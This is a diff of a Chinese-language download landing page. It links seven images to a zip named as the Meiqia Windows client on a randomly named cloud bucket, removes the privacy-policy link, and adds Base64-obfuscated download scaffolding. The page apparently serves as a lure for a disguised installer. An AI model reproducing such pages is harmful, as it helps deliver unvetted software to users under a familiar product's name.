@@ -13,36 +13,52 @@
             width: 100%;
             height: auto;
             display: block;
-            cursor: pointer; /* 鼠标指针样式 */
+            cursor: pointer; 
         }
     </style>
 </head>
 <body>
 
-    <img src="static/picture/d_01.jpg" alt="点击下载" onClick="downloadFile('#')">
-    <img src="static/picture/d_02.jpg" alt="点击下载" onClick="downloadFile('#')">
-    <img src="static/picture/d_03.jpg" alt="点击下载" onClick="downloadFile('#')">
-	<img src="static/picture/d_04.jpg" alt="点击下载" onClick="downloadFile('#')">
-	<img src="static/picture/d_05.jpg" alt="点击下载" onClick="downloadFile('#')">
-	 <img src="static/picture/d_06.jpg" alt="点击下载" onClick="downloadFile('#')">
-	 <img src="static/picture/d_07.jpg" alt="点击下载" onClick="downloadFile('#')">
-	 <a href="">隐私政策 </a>
+   <a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_01.jpg"></a>
+    <a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_02.jpg"></a>
+    <a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_03.jpg"></a>
+	<a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_04.jpg"></a>
+	<a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_05.jpg"></a>
+	 <a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_06.jpg"></a>
+	 <a href="https://1asfiodfzmlmaldvxzc.bj.bcebos.com/MeiqiaWinLatest.zip" target="_blank"><img src="static/picture/d_07.jpg"></a>
 
-    <script>
+
+ <script>
+        
+        const encryptedUrls = [
+            '##',
+            '##',
+            '##',
+            '##',
+            '##',
+            '##',
+            '##'
+        ];
         function base64Decode(base64) {
-            return atob(base64); // 解码Base64字符串
+            return atob(base64); 
         }
-
         function downloadFile(encodedUrl) {
-            const url = base64Decode(encodedUrl); // 解码链接
+            const url = base64Decode(encodedUrl); 
             const link = document.createElement('a');
             link.href = url;
-            link.download = ''; // 可选：指定文件下载时的名称
-            document.body.appendChild(link); // 将链接添加到文档中
-            link.click(); // 模拟点击链接
-            document.body.removeChild(link); // 下载后移除链接
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
         }
-    </script>
-
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>     
 </body>
 </html>
